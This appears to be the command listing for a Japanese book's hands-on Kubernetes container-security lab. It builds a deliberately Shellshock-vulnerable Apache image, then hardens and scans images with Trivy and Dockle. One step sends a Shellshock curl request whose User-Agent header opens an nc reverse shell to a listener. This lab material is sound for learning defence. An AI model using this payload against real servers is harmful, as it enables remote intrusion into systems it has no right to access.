# ケース1: コンテナの脆弱性を悪用されてしまった

`コンテナイメージのビルド（cve-2014-6271-apache-debian:buster）`
```bash
ls

docker build -t <Docker ID>/cve-2014-6271-apache-debian:buster .
```

`コンテナイメージのアップロード（cve-2014-6271-apache-debian:buster）`
```bash
docker push <Docker ID>/cve-2014-6271-apache-debian:buster
```

`コンテナイメージのビルド（sample-web:case1）`
```bash
ls

docker build -t <Docker ID>/sample-web:case1 .
```

`コンテナイメージのアップロード（sample-web:case1）`
```bash
docker push <Docker ID>/sample-web:case1
```

`PodとServiceのデプロイ`
```bash
kubectl apply -f sample-web.yaml
```

`minikube tunnelコマンドの実行`
```bash
minikube tunnel
```

`PodおよびServiceの状態確認`
```bash
kubectl get all -l app=sample-web
```

`curlコマンドによるアクセス確認`
```bash
curl http://<EXTERNAL-IP>
```

`ターミナル1: ncコマンドの実行`
```bash
nc -nvlp 5050
```

`ターミナル2: curlコマンドによる不正なリクエストの送信`
```bash
curl -H "user-agent: () { :; }; echo; /bin/nc -e /bin/bash <端末のIPアドレス> 5050" http://<EXTERNAL-IP>/cgi-bin/vulnerable
```

`ターミナル1: Podに含まれるコンテナへの侵入`
```bash
hostname

id
```

`ターミナル1: コンテナ内でのrootユーザーへの切り替え`
```bash
sudo su -

id
```

`ターミナル1: rootユーザー権限での操作`
```bash
cd /

touch test

ls /test

apt-get update

apt-get install -y curl

curl -h
```

`通常のhttpdとalpineベースのサイズ比較`
```bash
docker pull httpd:2.4.57

docker pull httpd:2.4.57-alpine

docker images httpd
```

`リストX.1.23. hello-worldコンテナの起動`
```bash
docker run --rm hello-world
```

`コンテナイメージのサイズ確認（マルチステージビルドなし）`
```bash
docker build -t <Docker ID>/sample-web:go-standard -f Dockerfile-standard .

docker images <Docker ID>/sample-web:go-standard
```

`コンテナイメージのサイズ確認（マルチステージビルドあり）`
```bash
docker build -t <Docker ID>/sample-web:go-multi -f Dockerfile-multi .

docker images <Docker ID>/sample-web:go-multi
```

`リポジトリへのコンテナイメージアップロード（sample-web-go）`
```bash
docker push <Docker ID>/sample-web:go-standard

docker push <Docker ID>/sample-web:go-multi
```

`Podのデプロイと確認`
```bash
kubectl apply -f sample-web-go-standard.yaml

kubectl apply -f sample-web-go-multi.yaml

kubectl get pods -l app=sample-web-go
```

`sample-web-go-standardに対するkubectl execの実行`
```bash
kubectl exec -it sample-web-go-standard -- /bin/bash

root@sample-web-go-standard:/go/src/app# ps aux

root@sample-web-go-standard:/go/src/app# exit
```

`sample-web-go-multiに対するkubectl execの実行`
```bash
kubectl exec -it sample-web-go-multi -- /bin/bash
```

`エフェメラルコンテナの使用`
```bash
kubectl debug -it sample-web-go-multi --image=busybox:1.28 --target=web

/ # ps aux

/ # ls /proc/1/root

/ # exit
```

`エフェメラルコンテナの状態確認`
```bash
kubectl describe pod sample-web-go-multi
```


`Trivyのインストール`
```bash
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sudo sh -s -- -b /usr/local/bin v0.50.1
```

`Trivyによるコンテナイメージのスキャン（2024年4月時点）`
```bash
trivy image <Docker ID>/sample-web:case1
```

`Dockleのインストール`
```bash
curl -LO https://github.com/goodwithtech/dockle/releases/download/v0.4.14/dockle_0.4.14_Linux-64bit.tar.gz

tar xvf dockle_0.4.14_Linux-64bit.tar.gz

chmod +x ./dockle

sudo mv ./dockle /usr/local/bin/dockle
```

`Dockleによるコンテナイメージのスキャン（2024年4月時点）`
```bash
dockle <Docker ID>/sample-web:case1
```

`検証に使用したリソースの削除`
```bash
kubectl delete pod sample-web \
    sample-web-go-standard \
    sample-web-go-multi

kubectl delete service sample-web
```